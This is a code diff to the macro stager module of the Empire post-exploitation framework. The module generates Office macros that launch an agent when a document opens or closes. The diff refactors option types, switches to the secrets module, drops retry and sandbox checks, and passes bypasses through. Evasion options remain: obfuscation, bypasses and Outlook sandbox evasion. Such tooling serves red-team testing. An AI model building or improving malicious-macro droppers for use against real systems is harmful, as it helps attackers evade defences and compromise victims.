@@ -1,10 +1,8 @@
-import logging
-import random
+import secrets
 import string
 
 from empire.server.common import helpers
-
-log = logging.getLogger(__name__)
+from empire.server.core.exceptions import StagerGenerationException
 
 
 class Stager:
@@ -42,11 +40,6 @@ class Stager:
                 "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
-            "StagerRetries": {
-                "Description": "Times for the stager to retry connecting.",
-                "Required": False,
-                "Value": "0",
-            },
             "OutFile": {
                 "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                 "Required": False,
@@ -55,16 +48,12 @@ class Stager:
             "Base64": {
                 "Description": "Base64 encode the output.",
                 "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": True,
             },
             "Obfuscate": {
                 "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
                 "DependsOn": [{"name": "Language", "values": ["powershell"]}],
             },
             "ObfuscateCommand": {
@@ -75,13 +64,6 @@ class Stager:
                     {"name": "Language", "values": ["powershell"]},
                     {"name": "Obfuscate", "values": ["True"]},
                 ],
-            },
-            "SafeChecks": {
-                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
-                "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
             },
             "UserAgent": {
                 "Description": "User-agent string to use for the staging request (default, none, or other).",
@@ -102,13 +84,12 @@ class Stager:
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
                 "Value": "",
+                "BypassLanguage": "powershell",
             },
             "OutlookEvasion": {
                 "Description": "Include BC-Security's Outlook Sandbox evasion code",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
             },
             "Trigger": {
                 "Description": "Trigger for the macro (autoopen, autoclose).",
@@ -138,8 +119,6 @@ class Stager:
         user_agent = self.options["UserAgent"]["Value"]
         proxy = self.options["Proxy"]["Value"]
         proxy_creds = self.options["ProxyCreds"]["Value"]
-        stager_retries = self.options["StagerRetries"]["Value"]
-        safe_checks = self.options["SafeChecks"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
         outlook_evasion = self.options["OutlookEvasion"]["Value"]
         trigger = self.options["Trigger"]["Value"]
@@ -155,36 +134,18 @@ class Stager:
         else:
             macro_sub_name = "AutoClose()"
 
-        encode = False
-        if base64.lower() == "true":
-            encode = True
-
-        invoke_obfuscation = False
-        if obfuscate.lower() == "true":
-            invoke_obfuscation = True
-
-        outlook_evasion_bool = False
-        if outlook_evasion.lower() == "true":
-            outlook_evasion_bool = True
+        encode = base64
+        invoke_obfuscation = obfuscate
+        outlook_evasion_bool = outlook_evasion
 
         if language in ["csharp", "ironpython"]:
-            if (
-                self.mainMenu.listenersv2.get_active_listener_by_name(
-                    listener_name
-                ).info["Name"]
-                != "HTTP[S]"
-            ):
-                log.error(
-                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
-                )
-                return ""
-
-            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
+            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner_routed(
                 language=language,
                 obfuscate=invoke_obfuscation,
                 obfuscation_command=obfuscate_command,
                 encode=encode,
                 listener_name=listener_name,
+                bypasses=bypasses,
             )
         elif language == "powershell":
             launcher = self.mainMenu.stagergenv2.generate_launcher(
@@ -196,22 +157,19 @@ class Stager:
                 user_agent=user_agent,
                 proxy=proxy,
                 proxy_creds=proxy_creds,
-                stager_retries=stager_retries,
-                safe_checks=safe_checks,
                 bypasses=bypasses,
             )
 
-        if launcher == "":
-            log.error("[!] Error in launcher command generation.")
-            return ""
+        if not launcher:
+            raise StagerGenerationException("Error in launcher command generation.")
 
         set_string = "".join(
-            random.choice(string.ascii_letters)
-            for i in range(random.randint(1, len(listener_name)))
+            secrets.choice(string.ascii_letters)
+            for i in range(secrets.randbelow(len(listener_name)) + 1)
         )
         set_method = "".join(
-            random.choice(string.ascii_letters)
-            for i in range(random.randint(1, len(listener_name)))
+            secrets.choice(string.ascii_letters)
+            for i in range(secrets.randbelow(len(listener_name)) + 1)
         )
 
         chunks = list(helpers.chunks(launcher, 50))
